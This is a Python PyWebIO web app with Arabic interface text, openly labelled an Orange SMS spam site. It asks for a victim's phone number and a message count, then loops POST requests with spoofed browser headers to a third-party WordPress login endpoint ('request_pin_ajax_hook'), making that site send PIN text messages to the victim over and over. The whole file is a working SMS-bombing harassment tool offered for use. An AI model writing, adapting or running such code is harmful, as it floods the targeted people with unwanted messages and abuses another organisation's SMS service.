from pywebio.output import *
from pywebio.input import *
from pywebio import start_server
from pywebio.pin import *
from pywebio.session import *
import requests


def MyApp():
    popup('اهلا بك في موقع حمودي @egy_p_t',
          put_text('7amody @egy_p_t').onclick(lambda: toast('موقع اسبام رسايل ORANGE'))
          )
    put_image('https://d1fmx1rbmqrxrr.cloudfront.net/cnet/optim/i/edit/2019/12/orange-logo-big__w770.jpg')
    data = input_group(
        'سبام اورانج',
        [
            input('رقم الضحيه', name='number'),
            input('عدد الرسايل', name="spam")
        ]  # validate=vaildate_user
    )
    number = data["number"]
    sms = data["spam"]
    for i in range(int(sms)):
        url = 'http://m3hakim.com/wp-admin/admin-ajax.php'
        head = {
    'Host': 'm3hakim.com',
    'Connection': 'keep-alive',
    'Content-Length': '53',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'http://m3hakim.com',
    'Referer': 'http://m3hakim.com/login/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8'
}
        data = f'action=request_pin_ajax_hook&mobileNumber={number}'
        r = requests.post(url, headers=head, data=data).text
        if "null" in r:
            put_html("<h3>فشل ارسال الرساله يمكن ان يكون رقم الهاتف غير صحيح</h3>")
        else:
            put_html("<h3>تم ارسال الرساله ✅ </h3>")
start_server(MyApp, port=8193, debug=True)
